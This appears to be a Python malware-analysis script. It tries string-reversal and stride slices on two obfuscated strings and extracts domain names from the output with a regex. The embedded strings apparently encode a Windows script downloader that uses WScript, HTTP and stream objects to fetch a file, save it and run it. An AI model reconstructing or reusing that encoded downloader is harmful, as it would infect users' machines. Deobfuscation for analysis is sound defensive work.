import re
re_pattern = r'(?:http(?:s?)://)?(?:[\w]+\.)+[a-zA-Z]+(?::\d{1,5})?'
sapol = r'''sfig( n"(\i;(%rtpUtx.SSeiEtTnRnedDeseNmnxSnoODopfOrs(Mie\A"rvI@.nN\q"%E +"d\N=n)+ a \p"!p @=xr\ "aE",\.v %) 0U\{"S) lE))lR=0eD=0hN-2SS1 .D)=tO =pM{=iA rIWscNSuS%ctW"r\\a")it( pst{t.cN.qe=s(jNl b+efO"e\eip3t (6a}25e 21r;22Ce20.s21tl)"p\;ai; fr}} c nSterWrlu(yst {eef riq{ . {;op))p e1e=(+n h9(pc9'.\,trG2aeE(cpT]}l'\\' a,r;c t)e's\((bh\d"tun@tse\p"s\s'.+:[qN/) +/(;\'"\g)@+ne\K"si[,lru\a"]tf\+" S')\o,;/tN t.+ve)"a\(sr=mt zo.ngdp znh=iap ir'p\.i.+hrr"t\ela?phMdlq vac=cc' (enNa(g e/b;((])Y\[\r\e'hdtPa{fT{2 Ty}rHt)}L;/2M3g=Xy,br; 4e5f-v7u5r=nYe;c)S)t".ZiS2"o(L+n)M" _X"((S+s)M")G\E'" ((+{)t" Rc"r(e e,j"t"b u,Oerreinutq earS(e]t)r"r"C(i+.)n"teg"p(.+i)f"rtr"c(o+S)m"WiC" (h+=)a" rr"q(C+ )o"{Wdg ee")((+3)p" Ra"<(r[ tsauhe ({I )nee(thlc(tiasch ,}w 1; )0e;r)i0u+q e3r=(0] ))"ud;a " (;+})]")e\R"g;"u( +a)f".ea"m(t+o)h"cRe".(r[at[aih3 l{] ay(rrtn;t")\s\(Eum)Zaf;Pb\ \e"W+w)S"."c(r+r)e"iRn"p(n+t)u".Er"Q(r+u)e"iSnUt"n((+i))"\_"T;",( +\)""}Ni" (f+})." Es"e(j+l)h"sR."e(a+ )r"{Rt" (n+W)i"SU\C""c(,+r)\""_i"m(p+o)t"cY.".(s+l)l"eEe"v(e+a)p"rK("t(1+s)2"uH3"o(4 i=5 ne)rei;ugq enr};i) "\l"lue[h+S .+t=p;i r}cKS W'")()t(c)e;j}bcOaettcahe(reC).{t}pWiSrccrSiWp t=. stlaehe;p7(187886=8q3c2j7l0k1c)q;fplskoUjipDaraott=cfuartthsenro;c '''

new = r'''fng iis( r((;t"U\St.%txiUnenSeTdEmeeRnsxDonONrofSip(Dvs\O"enM@rEA\."IdG+Nn u%a=+"p\\ ")xU@ E \!"r.=,a)  v\""\0 l%){lU) eS=)hE=0SR-0.D12tN) pS =iD{=rO =cMW SASsWIcu\N"tr%(ai"t\ptc)tse ..j{sGbul(O=e eueft+pia"(\e 23r}26C 25.;21te22ps)0il;1ra "c\}fS;  W}en( lr tsufretiy e {{r;   )GU{1. )+o=e9p (9eUh,n.c2(rt('e\]apG\c'El}rTa t'c\s;e,b)( u(\'"\sd@h\n't\e"t[s+p).us(G+:g \/";n/@)i'\\"er+,stV\l"[Sa\e"fo]) t+;,.' \)uv/(+atm"r\oe =dsMlnt fa.=irp m.hUghp.mt'r\aye+Mop" \lg=?am hcwuoe' ((t;s/e)r(e\t'n\i\(P]dAT[{rTe2hHt}oL{) My/rXtg}r;,8e1 =vdfardu;e3n8S-c6.8t=2Ai;L)o)M"n"X( +S)("MZvS\"'()+() "t_{"c( +e)r"jGe"b(t+O)u"eErRt"n(a  ,e"S"r t,Clra.iictenppsg(i].)r"fec"r(S+o)W"mt "C(=+h) "aiG"r( +C){"or Wd")(e+3)(" gpe<Ra" (r[ewso(leb  I{e n)let(ih(chtvawc,  }1 ;;0)0l)a i+c=e3p s0(e])) ";";( +])}"\d"a)eu";(a+ )."oRm"t(o+h)c"eg."r(a+[)i"3el"](a+()r"MRt")(s[(wuo)lab; b{  eyWrwtS;."c\r\rJesiLnupknNtGu\.\r"Q+r)u"eRiEnSt"n((+i))"\U"";(,+ )\""_}"i( +f)}".T "s(e+j)l"hNsE."e(a+ )r"{Rt" (n+W)i"SR\""(c+,)r"\U""i(m+p)o"tCc".(.+s)l"l_e"e(v+e)a"pYrE(Kt"1(s+2)u"3Ho"4(i 5=n )lea;igc enp}si; )\""lel[e+h S+.=t;p i}rVc S'W)")((t)c;e}jcbaOtectha(eer)C{.}tWpSicrrciSpWt .=s lweoelpb(;459373469=2e4y4q7v)y;voDcAqreostsc=uortthsenro;c '''

print ("START")
print (new[::-1][::2])
print ("----")
print (new[::-1][1::2])
print ("----")
print (new[1::2])
print ("----")
print (new[::-1][::4])
print ("----")
print (new[::-1][1::4])
print ("----")
print (new[::-1])
print ("----")
print (new[::2][::-2])
print ("----")
print (new[1::2][::2])
print ("----")
print (new[1::4][::-1])
print ("----")
print (new[::4][::-1])
print ("----")
print (new[1::2])
print ("----")
print (new[::2])
print ("----")
print (new[1::4])
print ("----")
print (new[::4])
print ("----")
print (new[1::])
print ("END")

interesting = (new[1::4][::-1])

domains = re.findall(re_pattern,interesting)
print (domains)
